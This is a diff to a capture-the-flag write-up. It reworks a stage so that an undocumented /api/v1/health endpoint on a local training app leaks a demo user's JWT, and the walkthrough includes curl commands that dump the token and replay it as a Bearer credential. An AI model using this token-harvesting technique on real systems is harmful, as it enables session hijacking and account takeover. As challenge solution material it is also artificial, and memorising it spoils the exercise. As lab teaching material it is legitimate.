@@ -1,7 +1,7 @@
-# Stage 1 Solve Writeup: Undocumented Legacy Endpoint
+# Stage 1 Solve Writeup: Session Hijacking via Undocumented Debug Endpoint
 
 ## Description
-Stage 1 introduces an undocumented legacy endpoint `/api/v1/health` that is not referenced in the frontend application or documented in the primary public API specifications. A user can discover this path only by guessing URLs, performing manual exploration, or running directory/API path brute-forcing utilities (like `gobuster`, `ffuf`, `dirb`, or `wfuzz`).
+Stage 1 simulates a realistic session hijacking vulnerability (CWE-613 Insufficient Session Expiration & CWE-200 Information Exposure). An undocumented legacy API route `/api/v1/health` leaks active authentication tokens of logged-in sessions (specifically, the pre-authenticated `demo` account). An attacker can harvest this token and use it to access the application as the compromised user. When the token is used for the first time by an unauthorized client, a telemetry trigger reports the misuse to the PWNDORA CTF coordinator.
 
 ## Discovery Commands
 
@@ -22,23 +22,28 @@ ffuf -u http://localhost:8000/api/FUZZ/health -w /usr/share/wordlists/secLists/D
 ## Solution Flow
 1. Run directory enumeration against the host root or the `/api` root.
 2. Find `/api/v1/health` responding with a `200 OK` status code.
-3. Access `http://localhost:8000/api/v1/health` via `curl` or browser:
+3. Access `http://localhost:8000/api/v1/health` via `curl` or browser to dump the active leaked demo JWT token:
    ```bash
    curl http://localhost:8000/api/v1/health
    ```
-4. Extract the leaked flag from the response JSON body:
+4. Extract the leaked JWT token from the response body structure:
    ```json
    {
      "status": "ok",
      "service": "inbanaturals-api",
      "version": "1.0.4-legacy",
-     "internal_flag": "STAGE1_FLAG_<random_hex>",
+     "debug_active_sessions": [
+       {
+         "username": "demo",
+         "token": "eyJhbGciOi..."
+       }
+     ],
      "debug_mode": true
    }
    ```
-
-5. Trigger progression reporting to the CTF coordinator by supplying the session parameter:
+5. Trigger progress reporting to the CTF platform by sending an authenticated request using the stolen token to any protected endpoint (like `/api/auth/me`) supplying your active PWNDORA session identifier in the query parameter (or header):
    ```bash
-   curl "http://localhost:8000/api/v1/health?session=<session_id>"
+   curl -H "Authorization: Bearer eyJhbGciOi..." "http://localhost:8000/api/auth/me?session=<session_id>"
    ```
-   This automatically triggers a signed HMAC-SHA256 webhook to the platform Coordinator to unlock Stage 2.
+   This triggers the backend's compromise-detection logic, which reports the hijack event to the coordinator via a signed HMAC-SHA256 webhook to unlock Stage 2.
+
